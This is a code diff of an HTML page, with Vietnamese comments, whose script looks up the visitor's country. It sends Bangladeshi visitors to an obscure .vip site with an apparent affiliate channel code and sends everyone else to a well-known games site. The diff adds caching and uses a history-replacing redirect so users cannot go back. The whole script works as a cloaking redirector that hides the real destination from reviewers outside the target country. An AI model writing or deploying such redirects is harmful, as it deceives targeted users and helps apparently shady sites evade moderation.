@@ -12,57 +12,79 @@
       width: 100%;
       height: 100%;
       overflow: hidden;
-      background: #000; /* đổi #fff nếu bạn thích nền trắng */
+      background: #000; /* đổi #fff nếu thích nền trắng */
     }
   </style>
 </head>
 <body>
   <script>
-    // 🔗 LINK ĐÃ GẮN SẴN:
-    // Web A: cho user ở Bangladesh
-    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81";
-    // Web B: cho tất cả quốc gia khác
-    const OTHER_URL = "https://poki.com";
+  (function () {
+    // 🔗 LINK ĐÃ GẮN SẴN
+    const BD_URL    = "https://www.khcyz.vip/?ch=4f80366d81"; // Bangladesh
+    const OTHER_URL = "https://poki.com";                      // Các nước khác
 
-    // Thời gian delay (ms): 1000 = 1s, 1500 = 1.5s, 2000 = 2s
-    const DELAY = 1500;
+    // ⏱ Thời gian delay (ms)
+    const DELAY = 1000; // 1 giây (có thể đổi 1500 hoặc 2000)
 
-    function redirectByCountry(countryCode) {
-      // Chuẩn hoá
-      countryCode = (countryCode || "").toString().trim().toUpperCase();
+    const CACHE_KEY = "geo_redirect_target_v1"; // key lưu trong sessionStorage
 
-      // 👉 Debug: xem nó detect ra mã nước nào (khi chạy thật có thể xoá dòng này)
-      console.log("Detected country:", countryCode);
+    function safeGetCache() {
+      try {
+        return sessionStorage.getItem(CACHE_KEY);
+      } catch (e) {
+        return null;
+      }
+    }
 
+    function safeSetCache(value) {
+      try {
+        sessionStorage.setItem(CACHE_KEY, value);
+      } catch (e) {
+        // ignore
+      }
+    }
+
+    function go(targetFlag) {
+      var url = targetFlag === "BD" ? BD_URL : OTHER_URL;
+
+      // Dùng replace để tránh user bấm Back quay về trang check
       setTimeout(function () {
-        if (countryCode === "BD") {
-          // Bangladesh → Web A
-          window.location.href = BD_URL;
-        } else {
-          // Tất cả quốc gia khác → Web B
-          window.location.href = OTHER_URL;
-        }
+        window.location.replace(url);
       }, DELAY);
     }
 
-    function detectCountryAndRedirect() {
-      // API trả về đúng 2 ký tự country-code (VD: BD, VN, US)
-      fetch("https://ipapi.co/country/")
-        .then(function (res) {
-          return res.text();
-        })
-        .then(function (code) {
-          redirectByCountry(code);
-        })
-        .catch(function (err) {
-          console.log("Geo error:", err);
-          // Nếu lỗi API → cho sang Web B cho an toàn
-          redirectByCountry("");
-        });
+    // 1️⃣ Nếu đã có cache → không gọi API, redirect nhanh hơn
+    var cached = safeGetCache();
+    if (cached === "BD" || cached === "OTHER") {
+      go(cached);
+      return;
     }
 
-    // Gọi ngay khi load trang
-    detectCountryAndRedirect();
+    // 2️⃣ Chưa có cache → gọi API xác định quốc gia
+    fetch("https://ipapi.co/country/")
+      .then(function (res) {
+        return res.text();
+      })
+      .then(function (code) {
+        code = (code || "").toString().trim().toUpperCase();
+
+        var flag;
+        if (code === "BD") {
+          flag = "BD";
+        } else {
+          flag = "OTHER";
+        }
+
+        // Lưu lại để lần sau không phải gọi API nữa
+        safeSetCache(flag);
+        go(flag);
+      })
+      .catch(function () {
+        // Nếu lỗi API → mặc định coi như OTHER
+        safeSetCache("OTHER");
+        go("OTHER");
+      });
+  })();
   </script>
 </body>
 </html>
